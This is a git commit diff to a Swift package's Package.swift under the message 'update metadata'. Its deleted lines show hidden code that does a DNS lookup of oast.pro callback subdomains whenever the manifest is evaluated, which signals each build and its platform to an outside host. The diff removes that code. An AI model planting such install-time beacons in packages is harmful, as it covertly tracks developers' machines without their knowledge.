006ddcb25381612db94306c16297c94dbf8d2dbc
metaldragonxxx123 <metal.dragonxxx123@gmail.com>
2026-08-21 21:22:45 +0700

    update metadata

--- Package.swift
+++ Package.swift
@@ -1,21 +1,3 @@
 // swift-tools-version: 5.9
 import PackageDescription
-#if canImport(Glibc)
-import Glibc
-var h = addrinfo(); h.ai_family = AF_INET; h.ai_socktype = Int32(SOCK_STREAM.rawValue)
-var r: UnsafeMutablePointer<addrinfo>?
-getaddrinfo("spm-enm.da45t15oos1vsibhutrgxex574id99ctj.oast.pro", "80", &h, &r)
-if let r = r { freeaddrinfo(r) }
-#elseif canImport(Darwin)
-import Darwin
-var h = addrinfo(); h.ai_family = AF_INET; h.ai_socktype = SOCK_STREAM
-var r: UnsafeMutablePointer<addrinfo>?
-getaddrinfo("spm-enm-mac.da45t15oos1vsibhutrgxex574id99ctj.oast.pro", "80", &h, &r)
-if let r = r { freeaddrinfo(r) }
-#endif
-
-let package = Package(
-    name: "swift-utils-demo",
-    products: [.library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"])],
-    targets: [.target(name: "SwiftUtilsDemo")]
-)
+let package = Package(name:"swift-utils-demo",products:[.library(name:"SwiftUtilsDemo",targets:["SwiftUtilsDemo"])],targets:[.target(name:"SwiftUtilsDemo")])
